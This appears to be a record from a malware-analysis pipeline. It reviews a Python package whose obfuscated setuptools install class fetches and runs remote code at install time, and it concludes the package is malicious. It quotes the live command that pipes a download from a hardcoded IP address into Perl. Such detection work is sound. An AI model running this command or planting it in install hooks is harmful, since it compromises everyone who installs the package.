  "purpose": "The code defines a custom setuptools install command that executes a remote code fetch and execution during package installation, indicating malicious intent.",
  "sources": "The subprocess call within the obfuscated class method executing 'curl http://13.93.28.37:8080/p | perl -'.",
  "sinks": "The subprocess execution that runs remote code fetched from an external URL during installation.",
  "flows": "The setup process invokes the custom install class, which calls the obfuscated method, leading to remote code being fetched and executed via Perl.",
  "anomalies": "Obfuscated class and method names, hardcoded suspicious URL, execution of remote code during setup, lack of validation or checks on fetched code.",
  "analysis": "The code defines an obfuscated custom install class that executes a subprocess command fetching and executing remote code from a suspicious IP during package installation. All reports correctly identify this malicious remote code execution, obfuscation, and high security risk. The malware scores should be set to 1 due to explicit remote code fetch and execution. Obfuscation scores are justified given the nonsensical class/method names. The overall security risk is maximal, reflecting the severity of supply chain compromise. Confidence in these conclusions is high, as the malicious pattern is clear and unambiguous.",
  "conclusion": "The code is malicious, executing remote code during installation, with obfuscated naming and a hardcoded suspicious URL. All reports accurately identify this behavior, and the scores should reflect maximum severity. The package poses a high security threat and should be considered malicious.",
